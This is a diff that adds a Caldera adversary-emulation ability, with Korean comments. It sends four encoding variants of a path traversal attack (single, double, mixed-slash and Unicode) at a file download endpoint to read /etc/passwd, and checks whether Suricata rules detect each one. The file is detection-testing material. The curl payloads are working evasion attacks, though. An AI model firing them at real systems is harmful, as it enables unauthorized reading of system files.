@@ -1,0 +1,43 @@
+- id: 55e6f7a8-9b0c-4123-cef0-123456789005
+  name: Path Traversal - Evasion Variants
+  description: Path Traversal 공격을 다양한 인코딩으로 우회 시도합니다. URL 이중 인코딩, Mixed slash, 16-bit Unicode 등 4가지 변형으로 Suricata 시그니처 룰의 우회 가능성을 정량 측정합니다.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1027"
+          ABILITY_ID="55e6f7a8-9b0c-4123-cef0-123456789005"
+          TARGET="http://#{target.url}"
+
+          CURL_BASE=( -s -w " HTTP=%{http_code}\n" -o /dev/null
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: ${TECH_ID}"
+                      -H "X-Caldera-Ability: ${ABILITY_ID}"
+                      -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" )
+
+          echo "[*] Path Traversal Evasion 시나리오 (4종)"
+          echo ""
+
+          echo "[1] URL 단일 인코딩: %2e%2e%2f"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+          echo "[2] URL 이중 인코딩: %252e%252e%252f"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+
+          echo "[3] Mixed slash: ..\\..\\..\\etc/passwd"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=..%5C..%5C..%5C..%5Cetc%2Fpasswd"
+
+          echo "[4] 16-bit Unicode: %u002e%u002e%u002f"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=%u002e%u002e%u002f%u002e%u002e%u002fetc%2fpasswd"
+
+          echo ""
+          echo "[*] Evasion 종료 — Suricata SID별 발동 여부 확인"
